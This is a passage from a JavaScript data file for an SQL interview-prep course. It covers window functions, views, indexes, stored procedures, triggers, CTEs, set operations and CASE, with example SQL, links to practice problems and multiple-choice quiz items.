CURRENT ROW</code>. So LAST_VALUE only sees up to the current row, returning the current row\'s value. To get the true last value, explicitly set the frame: <code>ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING</code>.</p><p class="learn-p"><b>Q4: Can you use a window function in a WHERE clause?</b><br>A: No. Window functions are evaluated after WHERE, GROUP BY, and HAVING in the logical execution order. To filter based on a window function result, wrap the query in a subquery or CTE and filter in the outer query\'s WHERE clause.</p><p class="learn-p"><b>Q5: How do you compute a running total?</b><br>A: Use <code>SUM(amount) OVER (ORDER BY date_col ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)</code>. The ORDER BY within OVER establishes the running order, and the default frame (with ORDER BY) is cumulative from the start to the current row.</p><p class="learn-p"><b>Q6: What is the difference between ROWS and RANGE in a frame clause?</b><br>A: ROWS counts physical row positions (e.g., 2 PRECEDING means literally 2 rows before). RANGE considers logical value ranges (e.g., RANGE 2 PRECEDING includes all rows whose ORDER BY value is within 2 of the current row\'s value). For most practical purposes, ROWS is more predictable and commonly used.</p><p class="learn-p"><b>Q7: How do you detect consecutive sequences using window functions?</b><br>A: Assign ROW_NUMBER() and subtract it from the value column. Consecutive values produce the same difference (group identifier). For example, for values 1,2,3,7,8: subtracting ROW_NUMBER gives 0,0,0,3,3 &mdash; the constant value identifies each consecutive group.</p></div>',
          code: `-- =============================================
-- Window Functions: Complete Examples
-- =============================================

-- Setup data
CREATE TABLE Sales (
    id        INT PRIMARY KEY,
    emp_name  VARCHAR(100),
    dept      VARCHAR(50),
    amount    DECIMAL(10,2),
    sale_date DATE
);

INSERT INTO Sales VALUES
(1,'Alice','Electronics',5000,'2024-01-15'),
(2,'Bob','Electronics',3000,'2024-01-20'),
(3,'Carol','Clothing',4500,'2024-02-10'),
(4,'Alice','Electronics',7000,'2024-02-15'),
(5,'Dave','Clothing',3500,'2024-02-20'),
(6,'Bob','Electronics',6000,'2024-03-01'),
(7,'Carol','Clothing',5500,'2024-03-15'),
(8,'Alice','Electronics',4000,'2024-03-20');

-- 1. Ranking functions
SELECT emp_name, dept, amount,
    ROW_NUMBER() OVER (PARTITION BY dept ORDER BY amount DESC) AS row_num,
    RANK()       OVER (PARTITION BY dept ORDER BY amount DESC) AS rnk,
    DENSE_RANK() OVER (PARTITION BY dept ORDER BY amount DESC) AS dense_rnk
FROM Sales;

-- 2. Top 2 sales per department
SELECT * FROM (
    SELECT emp_name, dept, amount,
        ROW_NUMBER() OVER (PARTITION BY dept ORDER BY amount DESC) AS rn
    FROM Sales
) ranked
WHERE rn <= 2;

-- 3. Running total of sales by date
SELECT sale_date, emp_name, amount,
    SUM(amount) OVER (ORDER BY sale_date
        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
    ) AS running_total
FROM Sales;

-- 4. Department-level aggregates alongside row-level data
SELECT emp_name, dept, amount,
    SUM(amount)   OVER (PARTITION BY dept) AS dept_total,
    AVG(amount)   OVER (PARTITION BY dept) AS dept_avg,
    amount - AVG(amount) OVER (PARTITION BY dept) AS diff_from_avg
FROM Sales;

-- 5. LAG and LEAD
SELECT emp_name, sale_date, amount,
    LAG(amount, 1)  OVER (PARTITION BY emp_name ORDER BY sale_date) AS prev_sale,
    LEAD(amount, 1) OVER (PARTITION BY emp_name ORDER BY sale_date) AS next_sale,
    amount - LAG(amount, 1) OVER (
        PARTITION BY emp_name ORDER BY sale_date
    ) AS growth
FROM Sales;

-- 6. NTILE: quartiles of sales amounts
SELECT emp_name, amount,
    NTILE(4) OVER (ORDER BY amount) AS quartile
FROM Sales;

-- 7. Moving average (3-row window)
SELECT sale_date, amount,
    ROUND(AVG(amount) OVER (
        ORDER BY sale_date
        ROWS BETWEEN 2 PRECEDING AND CURRENT ROW
    ), 2) AS moving_avg_3
FROM Sales;

-- 8. Cumulative distribution
SELECT emp_name, amount,
    CUME_DIST()    OVER (ORDER BY amount) AS cume_dist,
    PERCENT_RANK() OVER (ORDER BY amount) AS pct_rank
FROM Sales;

-- 9. FIRST_VALUE and LAST_VALUE
SELECT emp_name, dept, amount,
    FIRST_VALUE(emp_name) OVER (
        PARTITION BY dept ORDER BY amount DESC
    ) AS top_seller,
    LAST_VALUE(emp_name) OVER (
        PARTITION BY dept ORDER BY amount DESC
        ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
    ) AS bottom_seller
FROM Sales;`,
          problems: [
            ['Rank Scores - LeetCode', 'https://leetcode.com/problems/rank-scores/', 'Medium'],
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Consecutive Numbers', 'https://leetcode.com/problems/consecutive-numbers/', 'Medium'],
            ['Nth Highest Salary', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium'],
            ['Rising Temperature', 'https://leetcode.com/problems/rising-temperature/', 'Easy'],
            ['Employees Earning More Than Managers', 'https://leetcode.com/problems/employees-earning-more-than-their-managers/', 'Easy']
          ],
          mcqs: [
            {q: 'For values (100, 100, 90), what does RANK() return?', o: ['1, 2, 3', '1, 1, 2', '1, 1, 3', '1, 2, 2'], a: 2},
            {q: 'Which window function accesses a value from the previous row?', o: ['LEAD()', 'LAG()', 'FIRST_VALUE()', 'NTH_VALUE()'], a: 1},
            {q: 'What is the default window frame when ORDER BY is specified in a window function?', o: ['ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING', 'RANGE BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW', 'ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING', 'No frame is applied'], a: 1},
            {q: 'Can you use a window function directly in a WHERE clause?', o: ['Yes, always', 'Yes, but only with PARTITION BY', 'No — you must use a subquery or CTE to filter on it', 'Only in PostgreSQL'], a: 2},
            {q: 'NTILE(4) applied to 10 rows produces groups of sizes:', o: ['3, 3, 3, 1', '3, 3, 2, 2', '2, 2, 3, 3', '4, 4, 1, 1'], a: 1},
            {q: 'Which function would you use to compare each row\'s value with the previous row?', o: ['FIRST_VALUE()', 'LEAD()', 'LAG()', 'NTH_VALUE()'], a: 2},
            {q: 'What distinguishes a window function from GROUP BY aggregation?', o: ['Window functions are faster', 'Window functions do not collapse rows into groups', 'GROUP BY supports more functions', 'Window functions cannot use ORDER BY'], a: 1}
          ]
        },
        {
          t: 'Views, Indexes & Stored Procedures',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Production databases at financial firms handle millions of queries per day, and understanding views, indexes, and stored procedures is what separates someone who can write SQL from someone who can design performant database systems. Views encapsulate complex portfolio calculations so analysts can query them simply. Indexes are the difference between a risk report that takes 50 milliseconds and one that takes 50 seconds. Stored procedures enforce business logic (like trade validation rules) at the database layer. Interviewers test whether you understand trade-offs: "When should you NOT add an index?", "Can you insert into a view?", "What is the leftmost prefix rule?" These questions probe real-world database design judgment.</p></div><div class="learn-section"><div class="learn-h">Views</div><p class="learn-p">A <b>view</b> is a virtual table based on the result of a SQL query. It does not store data itself — it is a saved query that is executed each time the view is referenced.</p><div class="learn-code">CREATE VIEW HighEarners AS\nSELECT name, salary, dept_id\nFROM Employees\nWHERE salary &gt; 90000;</div><p class="learn-p"><b>Advantages of views:</b></p><ul class="learn-list"><li><b>Simplification</b> — Complex queries can be encapsulated in a view</li><li><b>Security</b> — Restrict access to specific columns/rows</li><li><b>Logical data independence</b> — Schema changes hidden behind the view</li><li><b>Consistency</b> — Reuse the same query logic across applications</li></ul><p class="learn-p"><b>Updatable views</b>: A view is updatable if it maps directly to a single base table without aggregations, DISTINCT, GROUP BY, HAVING, UNION, or subqueries. Inserting/updating through the view modifies the base table.</p><div class="learn-warn"><b>Warning:</b> A common interview question: "Can you insert into a view?" The answer is yes, <b>only if</b> the view is updatable and all NOT NULL columns of the base table (without defaults) are present in the view.</div><p class="learn-p"><b>Materialized Views</b> store the result physically and must be refreshed. They trade storage for read performance. Not available in MySQL, but supported in PostgreSQL and Oracle.</p></div><div class="learn-section"><div class="learn-h">Indexes</div><p class="learn-p">An <b>index</b> is a data structure that improves the speed of data retrieval at the cost of additional storage and slower writes. Think of it as a book\'s index — instead of reading every page, you look up the topic and jump to the right page.</p><table class="learn-table"><tr><th>Index Type</th><th>Description</th><th>Use Case</th></tr><tr><td>B-Tree Index</td><td>Balanced tree; default in most RDBMS</td><td>Equality, range queries, ORDER BY</td></tr><tr><td>Hash Index</td><td>Hash table-based</td><td>Exact equality lookups only</td></tr><tr><td>Composite Index</td><td>Index on multiple columns</td><td>Multi-column WHERE/ORDER BY</td></tr><tr><td>Unique Index</td><td>Enforces uniqueness</td><td>Unique constraints</td></tr><tr><td>Full-Text Index</td><td>Optimized for text search</td><td>LIKE, full-text search</td></tr><tr><td>Clustered Index</td><td>Data rows sorted by index key</td><td>Primary key (InnoDB)</td></tr><tr><td>Non-Clustered</td><td>Separate structure pointing to data</td><td>Secondary indexes</td></tr></table><div class="learn-code">-- Create indexes\nCREATE INDEX idx_emp_salary ON Employees(salary);\nCREATE INDEX idx_emp_dept_salary ON Employees(dept_id, salary);\nCREATE UNIQUE INDEX idx_emp_email ON Employees(email);\n\n-- Show indexes\nSHOW INDEX FROM Employees;\n\n-- Drop index\nDROP INDEX idx_emp_salary ON Employees;</div><div class="learn-tip"><b>Tip:</b> For a composite index on (A, B, C), queries filtering on A, (A, B), or (A, B, C) can use the index. But a query filtering only on B or C cannot use this index efficiently — this is the <b>leftmost prefix rule</b>.</div><p class="learn-p"><b>When NOT to use indexes:</b></p><ul class="learn-list"><li>Small tables (full scan is faster)</li><li>Columns with low cardinality (e.g., boolean)</li><li>Tables with heavy write operations</li><li>Columns rarely used in WHERE/JOIN/ORDER BY</li></ul></div><div class="learn-section"><div class="learn-h">Stored Procedures and Functions</div><p class="learn-p">A <b>stored procedure</b> is a precompiled collection of SQL statements stored in the database. It can accept parameters, contain control flow logic, and perform complex operations.</p><div class="learn-code">DELIMITER //\nCREATE PROCEDURE GetEmployeesByDept(IN dept VARCHAR(50))\nBEGIN\n    SELECT name, salary\n    FROM Employees\n    WHERE dept_id = (\n        SELECT dept_id FROM Departments WHERE dept_name = dept\n    )\n    ORDER BY salary DESC;\nEND //\nDELIMITER ;\n\n-- Call the procedure\nCALL GetEmployeesByDept(\'Engineering\');</div><p class="learn-p"><b>Stored Functions</b> return a single value and can be used in SQL expressions:</p><div class="learn-code">DELIMITER //\nCREATE FUNCTION GetTaxAmount(salary DECIMAL(10,2))\nRETURNS DECIMAL(10,2)\nDETERMINISTIC\nBEGIN\n    IF salary &gt; 100000 THEN RETURN salary * 0.30;\n    ELSEIF salary &gt; 50000 THEN RETURN salary * 0.20;\n    ELSE RETURN salary * 0.10;\n    END IF;\nEND //\nDELIMITER ;</div><p class="learn-p"><b>Advantages</b>: Reduced network traffic, code reuse, security (EXECUTE privilege without table access), precompilation.</p><p class="learn-p"><b>Disadvantages</b>: Harder to debug, vendor lock-in, can become hard to maintain.</p></div><div class="learn-section"><div class="learn-h">Triggers</div><p class="learn-p">A <b>trigger</b> is a stored procedure that automatically executes in response to specific events (INSERT, UPDATE, DELETE) on a table.</p><div class="learn-code">CREATE TRIGGER before_salary_update\nBEFORE UPDATE ON Employees\nFOR EACH ROW\nBEGIN\n    IF NEW.salary &lt; 0 THEN\n        SIGNAL SQLSTATE \'45000\'\n        SET MESSAGE_TEXT = \'Salary cannot be negative\';\n    END IF;\n    INSERT INTO Salary_Audit(emp_id, old_salary, new_salary, changed_at)\n    VALUES (OLD.emp_id, OLD.salary, NEW.salary, NOW());\nEND;</div><p class="learn-p">Triggers can be <b>BEFORE</b> or <b>AFTER</b> and can fire on <b>INSERT</b>, <b>UPDATE</b>, or <b>DELETE</b>. Use <code>OLD</code> to reference pre-change values and <code>NEW</code> for post-change values.</p><div class="learn-warn"><b>Warning:</b> Triggers can cause unexpected cascading effects and make debugging difficult. Use them sparingly and document them well.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between a view and a materialized view?</b><br>A: A regular view is a saved query &mdash; it stores no data and re-executes each time it is queried. A materialized view physically stores the result set and must be explicitly refreshed. Regular views are always up-to-date but can be slow for complex queries. Materialized views are fast to read but may serve stale data between refreshes.</p><p class="learn-p"><b>Q2: Can you INSERT into a view? Under what conditions?</b><br>A: Yes, if the view is updatable: it must map to a single base table, contain no aggregations, DISTINCT, GROUP BY, HAVING, UNION, or subqueries, and all NOT NULL columns (without defaults) of the base table must be included. WITH CHECK OPTION prevents inserting rows that would not satisfy the view\'s WHERE clause.</p><p class="learn-p"><b>Q3: Explain the leftmost prefix rule for composite indexes.</b><br>A: For a composite index on (A, B, C), the index can be used for queries filtering on A, (A, B), or (A, B, C) &mdash; always starting from the leftmost column. A query filtering only on B or C cannot use this index efficiently. This is because B-tree indexes are organized hierarchically from left to right.</p><p class="learn-p"><b>Q4: What is the difference between a clustered and non-clustered index?</b><br>A: A clustered index determines the physical storage order of data rows &mdash; a table can have only one. In InnoDB (MySQL), the primary key is the clustered index. A non-clustered index is a separate B-tree structure that contains pointers (row IDs or primary key values) back to the actual data. Looking up data via a non-clustered index may require a second lookup (bookmark lookup) to fetch the full row.</p><p class="learn-p"><b>Q5: When should you NOT create an index?</b><br>A: Avoid indexes on: (1) small tables where a full scan is faster than index overhead; (2) columns with very low cardinality (e.g., boolean or gender); (3) tables with heavy INSERT/UPDATE/DELETE workloads since each write must update all indexes; (4) columns rarely used in WHERE, JOIN, or ORDER BY clauses.</p><p class="learn-p"><b>Q6: What is the difference between a stored procedure and a stored function?</b><br>A: A stored procedure can perform actions (INSERT, UPDATE, DELETE), return multiple result sets, and use IN/OUT/INOUT parameters. It is called with CALL. A stored function must return exactly one value, can be used inside SQL expressions (e.g., in SELECT), and generally cannot modify data. Functions must be deterministic if used in replication.</p><p class="learn-p"><b>Q7: What are the risks of using triggers?</b><br>A: Triggers can cause: (1) cascading effects that are hard to debug (trigger A fires trigger B); (2) hidden business logic that developers may not know exists; (3) performance overhead on every affected DML statement; (4) difficulty in testing and replication. They should be used sparingly and well-documented.</p></div>',
          code: `-- =============================================
-- Views, Indexes & Stored Procedures
-- =============================================

-- ========== VIEWS ==========

-- Simple view
CREATE VIEW ActiveEmployees AS
SELECT emp_id, name, dept_id, salary
FROM Employees
WHERE status = 'active';

-- View with join
CREATE VIEW EmployeeDeptView AS
SELECT e.emp_id, e.name, d.dept_name, e.salary
FROM Employees e
JOIN Departments d ON e.dept_id = d.dept_id;

-- Using a view
SELECT * FROM EmployeeDeptView WHERE salary > 80000;

-- Updatable view (single table, no aggregates)
CREATE VIEW EngineeringSalaries AS
SELECT emp_id, name, salary
FROM Employees
WHERE dept_id = 10
WITH CHECK OPTION;  -- prevents inserting rows that don't satisfy WHERE

-- Update through view
UPDATE EngineeringSalaries SET salary = 120000 WHERE emp_id = 5;

-- Drop view
DROP VIEW IF EXISTS ActiveEmployees;

-- ========== INDEXES ==========

-- Single column index
CREATE INDEX idx_salary ON Employees(salary);

-- Composite index (leftmost prefix rule applies)
CREATE INDEX idx_dept_salary ON Employees(dept_id, salary);

-- Unique index
CREATE UNIQUE INDEX idx_email ON Employees(email);

-- Analyze query plan
EXPLAIN SELECT * FROM Employees WHERE dept_id = 10 AND salary > 90000;
-- Should use idx_dept_salary

-- Queries that CAN use idx_dept_salary:
-- WHERE dept_id = 10
-- WHERE dept_id = 10 AND salary > 90000
-- Queries that CANNOT:
-- WHERE salary > 90000 (does not use leftmost prefix)

-- ========== STORED PROCEDURES ==========

DELIMITER //

-- Procedure with IN parameter
CREATE PROCEDURE RaiseSalary(
    IN p_dept_id INT,
    IN p_percent DECIMAL(5,2)
)
BEGIN
    UPDATE Employees
    SET salary = salary * (1 + p_percent / 100)
    WHERE dept_id = p_dept_id;

    SELECT CONCAT('Updated ', ROW_COUNT(), ' employees') AS result;
END //

-- Procedure with IN/OUT parameters
CREATE PROCEDURE GetDeptStats(
    IN  p_dept_id INT,
    OUT p_count   INT,
    OUT p_avg_sal DECIMAL(10,2)
)
BEGIN
    SELECT COUNT(*), AVG(salary)
    INTO p_count, p_avg_sal
    FROM Employees
    WHERE dept_id = p_dept_id;
END //

DELIMITER ;

-- Call procedures
CALL RaiseSalary(10, 5.00);
CALL GetDeptStats(10, @cnt, @avg);
SELECT @cnt AS count, @avg AS avg_salary;

-- ========== TRIGGERS ==========

DELIMITER //
CREATE TRIGGER audit_salary_change
AFTER UPDATE ON Employees
FOR EACH ROW
BEGIN
    IF OLD.salary <> NEW.salary THEN
        INSERT INTO Salary_Audit(emp_id, old_sal, new_sal, changed_at)
        VALUES (OLD.emp_id, OLD.salary, NEW.salary, NOW());
    END IF;
END //
DELIMITER ;`,
          problems: [
            ['Create a View - HackerRank', 'https://www.hackerrank.com/challenges/the-report/problem', 'Medium'],
            ['Index Optimization', 'https://www.geeksforgeeks.org/indexing-in-databases-set-1/', 'Medium'],
            ['Stored Procedures Basics', 'https://www.hackerrank.com/challenges/occupations/problem', 'Medium'],
            ['Trips and Users', 'https://leetcode.com/problems/trips-and-users/', 'Hard'],
            ['Game Play Analysis IV', 'https://leetcode.com/problems/game-play-analysis-iv/', 'Medium'],
            ['Human Traffic of Stadium', 'https://leetcode.com/problems/human-traffic-of-stadium/', 'Hard']
          ],
          mcqs: [
            {q: 'A materialized view differs from a regular view in that:', o: ['It can accept parameters', 'It stores the result set physically and must be refreshed', 'It is always updatable', 'It cannot join multiple tables'], a: 1},
            {q: 'For a composite index on (A, B, C), which WHERE clause can use the index efficiently?', o: ['WHERE B = 5', 'WHERE C = 10', 'WHERE A = 1 AND B = 2', 'WHERE B = 2 AND C = 3'], a: 2},
            {q: 'Which keyword in a trigger refers to the row values BEFORE the update?', o: ['NEW', 'OLD', 'BEFORE', 'PREVIOUS'], a: 1},
            {q: 'How many clustered indexes can a table have?', o: ['Unlimited', 'One per column', 'Exactly one', 'Two — one for primary key and one for a secondary column'], a: 2},
            {q: 'Which index type is best for exact equality lookups but cannot handle range queries?', o: ['B-Tree Index', 'Hash Index', 'Full-Text Index', 'Composite Index'], a: 1},
            {q: 'WITH CHECK OPTION on a view prevents:', o: ['SELECT queries on the view', 'Dropping the view', 'Inserting or updating rows that would not satisfy the view\'s WHERE clause', 'Creating indexes on the view'], a: 2},
            {q: 'A stored procedure differs from a function in that:', o: ['A procedure can only read data', 'A procedure cannot accept parameters', 'A procedure can perform DML and return multiple result sets', 'A procedure must return a single value'], a: 2},
            {q: 'EXPLAIN SELECT * FROM Employees WHERE salary > 50000; — this command:', o: ['Executes the query and returns results', 'Shows the query execution plan without running the query', 'Creates an index on the salary column', 'Deletes the query from the cache'], a: 1}
          ]
        },
        {
          t: 'CTEs, Set Operations & CASE',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">CTEs, set operations, and CASE expressions are the tools that turn SQL from a data retrieval language into a data transformation powerhouse. CTEs are used to build readable multi-step analytical queries &mdash; for example, computing a running P&amp;L by first aggregating daily trades, then joining with position data, then calculating cumulative returns. Recursive CTEs model hierarchical structures like organizational charts or instrument category trees. CASE expressions power pivot-style reports that transform rows into columns, and set operations (UNION, EXCEPT) combine data feeds from different sources. Interviewers love combining these constructs: "Using a CTE with window functions, find the month-over-month revenue growth per product category." Mastering this trio gives you the ability to solve virtually any SQL interview problem elegantly.</p></div><div class="learn-section"><div class="learn-h">Common Table Expressions (WITH Clause)</div><p class="learn-p">A <b>CTE</b> is a named temporary result set that exists only during query execution. It makes complex queries more readable than nested subqueries.</p><div class="learn-code">WITH high_earners AS (\n    SELECT department_id, name, salary\n    FROM employees\n    WHERE salary &gt; 100000\n)\nSELECT department_id, COUNT(*) AS count\nFROM high_earners\nGROUP BY department_id;</div><p class="learn-p">CTEs can reference each other and be used multiple times in the main query — unlike subqueries which are re-evaluated each time.</p></div><div class="learn-section"><div class="learn-h">Recursive CTEs</div><p class="learn-p"><b>Recursive CTEs</b> have a base case and a recursive step joined by <code>UNION ALL</code>. Essential for hierarchical data (org charts, tree structures, bill of materials).</p><div class="learn-code">-- Employee hierarchy: who reports to whom\nWITH RECURSIVE org_chart AS (\n    -- Base: CEO (no manager)\n    SELECT id, name, manager_id, 1 AS level\n    FROM employees WHERE manager_id IS NULL\n    UNION ALL\n    -- Recursive: employees under each manager\n    SELECT e.id, e.name, e.manager_id, o.level + 1\n    FROM employees e\n    JOIN org_chart o ON e.manager_id = o.id\n)\nSELECT * FROM org_chart ORDER BY level, name;</div><div class="learn-warn"><b>Warning:</b> Recursive CTEs can infinite-loop without a proper termination condition. Always ensure the recursive step eventually returns no rows. Add <code>LIMIT</code> or a depth check as a safety net.</div></div><div class="learn-section"><div class="learn-h">Set Operations</div><table class="learn-table"><tr><th>Operation</th><th>Behavior</th><th>Duplicates</th></tr><tr><td>UNION</td><td>Combines results from two queries</td><td>Removed</td></tr><tr><td>UNION ALL</td><td>Combines results from two queries</td><td>Kept (faster)</td></tr><tr><td>INTERSECT</td><td>Only rows in both queries</td><td>Removed</td></tr><tr><td>EXCEPT / MINUS</td><td>Rows in first but not second</td><td>Removed</td></tr></table><p class="learn-p">All set operations require the same number of columns with compatible data types. <code>UNION ALL</code> is faster than <code>UNION</code> because it skips the deduplication step.</p><div class="learn-code">-- Cities where we have customers OR suppliers\nSELECT city FROM customers\nUNION\nSELECT city FROM suppliers;\n\n-- Orders that were NOT refunded\nSELECT order_id FROM orders\nEXCEPT\nSELECT order_id FROM refunds;</div></div><div class="learn-section"><div class="learn-h">CASE Expression</div><p class="learn-p">CASE provides if/else logic inside SQL queries. Two forms:</p><div class="learn-code">-- Simple CASE (compare one value)\nSELECT name,\n    CASE grade\n        WHEN \'A\' THEN \'Excellent\'\n        WHEN \'B\' THEN \'Good\'\n        ELSE \'Needs Improvement\'\n    END AS performance\nFROM students;\n\n-- Searched CASE (arbitrary conditions)\nSELECT name, salary,\n    CASE\n        WHEN salary &gt; 100000 THEN \'High\'\n        WHEN salary &gt; 50000 THEN \'Mid\'\n        ELSE \'Entry\'\n    END AS band\nFROM employees;</div><p class="learn-p"><b>Conditional aggregation</b> — one of the most powerful patterns:</p><div class="learn-code">-- Pivot: count by department and gender in one query\nSELECT department,\n    SUM(CASE WHEN gender = \'M\' THEN 1 ELSE 0 END) AS male_count,\n    SUM(CASE WHEN gender = \'F\' THEN 1 ELSE 0 END) AS female_count\nFROM employees\nGROUP BY department;</div></div><div class="learn-section"><div class="learn-h">COALESCE &amp; NULLIF</div><p class="learn-p"><code>COALESCE(a, b, c)</code> returns the first non-NULL argument. Useful for defaults:</p><div class="learn-code">SELECT name, COALESCE(phone, email, \'No contact\') AS contact\nFROM users;\n-- NULLIF(a, b) returns NULL if a = b, otherwise a\n-- Useful to avoid division by zero:\nSELECT revenue / NULLIF(costs, 0) AS margin FROM sales;</div><div class="learn-tip"><b>Interview tip:</b> CTEs + CASE + window functions is the power combo for SQL interviews. Practice converting nested subqueries to CTEs for readability, and use conditional aggregation for pivot-style queries.</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is a CTE and how does it differ from a subquery?</b><br>A: A CTE (Common Table Expression) is a named temporary result set defined with the WITH clause. Unlike subqueries, CTEs can be referenced multiple times in the main query, improving readability and avoiding code duplication. CTEs can also be recursive. However, most databases treat non-recursive CTEs as inline expansions (similar to subqueries), so performance is usually equivalent.</p><p class="learn-p"><b>Q2: How does a recursive CTE work?</b><br>A: A recursive CTE has two parts joined by UNION ALL: (1) the anchor member (base case) that provides the initial rows, and (2) the recursive member that references the CTE itself and adds rows iteratively. Execution stops when the recursive member returns no new rows. Classic use cases include org chart traversal, tree flattening, and generating number series.</p><p class="learn-p"><b>Q3: What is the difference between UNION and UNION ALL?</b><br>A: UNION removes duplicate rows from the combined result (requiring a sort or hash for deduplication). UNION ALL keeps all rows including duplicates and is faster because it skips deduplication. Always use UNION ALL when you know there are no duplicates or when duplicates are acceptable.</p><p class="learn-p"><b>Q4: How do you pivot rows into columns without a PIVOT keyword?</b><br>A: Use conditional aggregation with CASE: <code>SELECT dept, SUM(CASE WHEN year = 2023 THEN revenue ELSE 0 END) AS rev_2023, SUM(CASE WHEN year = 2024 THEN revenue ELSE 0 END) AS rev_2024 FROM sales GROUP BY dept</code>. Each CASE expression creates one output column by selectively summing values that match the condition.</p><p class="learn-p"><b>Q5: What does COALESCE do and how does it differ from IFNULL?</b><br>A: COALESCE(a, b, c, ...) returns the first non-NULL argument from any number of inputs. It is standard SQL. IFNULL(a, b) is MySQL-specific and only takes two arguments. COALESCE is preferred for portability and flexibility. Common use: providing default values for nullable columns.</p><p class="learn-p"><b>Q6: What does NULLIF do and when is it useful?</b><br>A: NULLIF(a, b) returns NULL if a equals b, otherwise returns a. Its most common use is preventing division by zero: <code>revenue / NULLIF(units, 0)</code> returns NULL instead of raising an error when units is 0. Without NULLIF, you would need a CASE expression.</p><p class="learn-p"><b>Q7: Can CTEs reference each other?</b><br>A: Yes. In a WITH clause with multiple CTEs, each subsequent CTE can reference any previously defined CTE. For example: <code>WITH cte1 AS (...), cte2 AS (SELECT ... FROM cte1 ...) SELECT ... FROM cte2</code>. This allows building complex queries step by step for readability.</p></div>',
          code: `-- CTEs, Set Operations & CASE Examples

-- Recursive CTE: Generate numbers 1 to 10
WITH RECURSIVE nums AS (
    SELECT 1 AS n
    UNION ALL
    SELECT n + 1 FROM nums WHERE n < 10
)
SELECT * FROM nums;

-- Recursive CTE: Employee hierarchy with path
WITH RECURSIVE org AS (
    SELECT id, name, manager_id,
           CAST(name AS CHAR(200)) AS path, 1 AS depth
    FROM employees WHERE manager_id IS NULL
    UNION ALL
    SELECT e.id, e.name, e.manager_id,
           CONCAT(o.path, ' > ', e.name), o.depth + 1
    FROM employees e JOIN org o ON e.manager_id = o.id
)
SELECT * FROM org ORDER BY depth;

-- Conditional aggregation (pivot without PIVOT keyword)
SELECT
    YEAR(order_date) AS year,
    SUM(CASE WHEN MONTH(order_date) = 1 THEN amount ELSE 0 END) AS Jan,
    SUM(CASE WHEN MONTH(order_date) = 2 THEN amount ELSE 0 END) AS Feb,
    SUM(CASE WHEN MONTH(order_date) = 3 THEN amount ELSE 0 END) AS Mar
FROM orders
GROUP BY YEAR(order_date);

-- Running total using CTE
WITH ordered_sales AS (
    SELECT *, ROW_NUMBER() OVER (ORDER BY sale_date) AS rn
    FROM sales
)
SELECT sale_date, amount,
    SUM(amount) OVER (ORDER BY sale_date) AS running_total
FROM ordered_sales;

-- EXCEPT: Find customers who never ordered
SELECT customer_id FROM customers
EXCEPT
SELECT DISTINCT customer_id FROM orders;

-- COALESCE with multiple fallbacks
SELECT
    product_name,
    COALESCE(discount_price, regular_price, 0) AS final_price
FROM products;`,
          problems: [
            ['Department Top Three Salaries', 'https://leetcode.com/problems/department-top-three-salaries/', 'Hard'],
            ['Consecutive Numbers', 'https://leetcode.com/problems/consecutive-numbers/', 'Medium'],
            ['Tree Node', 'https://leetcode.com/problems/tree-node/', 'Medium'],
            ['Nth Highest Salary', 'https://leetcode.com/problems/nth-highest-salary/', 'Medium']
          ],
          mcqs: [
            {q: 'What is the difference between UNION and UNION ALL?', o: ['UNION sorts, UNION ALL does not', 'UNION removes duplicates, UNION ALL keeps all rows', 'UNION ALL is slower because it checks for duplicates', 'There is no difference'], a: 1},
            {q: 'Which keyword makes a CTE recursive?', o: ['LOOP', 'RECURSIVE (after WITH)', 'ITERATE', 'REPEAT'], a: 1},
            {q: 'What does COALESCE(NULL, NULL, 5, 3) return?', o: ['NULL', '3', '5', 'Error'], a: 2},
            {q: 'What does NULLIF(10, 10) return?', o: ['10', '0', 'NULL', 'Error'], a: 2},
            {q: 'Which set operation returns rows that appear in the first query but not the second?', o: ['UNION', 'INTERSECT', 'EXCEPT / MINUS', 'UNION ALL'], a: 2},
            {q: 'A recursive CTE must contain:', o: ['Only a base case', 'A base case and a recursive step joined by UNION ALL', 'A LOOP keyword', 'A LIMIT clause'], a: 1},
            {q: 'For set operations (UNION, INTERSECT, EXCEPT), which of the following is required?', o: ['Both queries must reference the same table', 'Both queries must have the same number of columns with compatible types', 'Both queries must have a WHERE clause', 'Both queries must use GROUP BY'], a: 1},
            {q: 'What does the CASE expression return if no WHEN condition matches and there is no ELSE clause?', o: ['0', 'An empty string', 'NULL', 'An error'], a: 2}
          ]
        }
      ]
    },
    {
      id: 'norm', t: 'Normalization',
      topics: [
        {
          t: 'Normalization (1NF, 2NF, 3NF, BCNF)',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Imagine a university database with a single table: <b>StudentCourse(student_id, student_name, phone, course_id, course_name, instructor, instructor_dept, grade)</b>. Every time a student enrolls in a course, all of their information is duplicated. If the student changes their phone number, you must update <i>every row</i> for that student — miss one, and you have inconsistent data. Delete the student\'s only enrollment, and you lose their contact information entirely. This is the world <b>without normalization</b>: redundancy breeds update, insertion, and deletion anomalies.</p><p class="learn-p">Normalization is one of the <b>most frequently tested DBMS topics</b> in technical interviews at top product and quant firms. Interviewers expect you to identify functional dependencies, determine candidate keys, check which normal form a relation satisfies, and decompose it correctly — all on a whiteboard. Mastering this topic is non-negotiable for any serious database interview.</p></div><div class="learn-section"><div class="learn-h">What is Normalization?</div><p class="learn-p"><b>Normalization</b> is the process of organizing a relational database to reduce <b>data redundancy</b> and prevent <b>update anomalies</b> (insertion, deletion, modification anomalies). It involves decomposing a table into smaller tables while preserving data integrity through functional dependencies.</p><p class="learn-p"><b>Why normalize?</b></p><ul class="learn-list"><li><b>Insertion anomaly</b> — Cannot insert data without other unrelated data (e.g., can\'t add a new department unless it has employees)</li><li><b>Deletion anomaly</b> — Deleting data causes unintended loss of other data (e.g., deleting the last employee in a dept loses the dept info)</li><li><b>Update 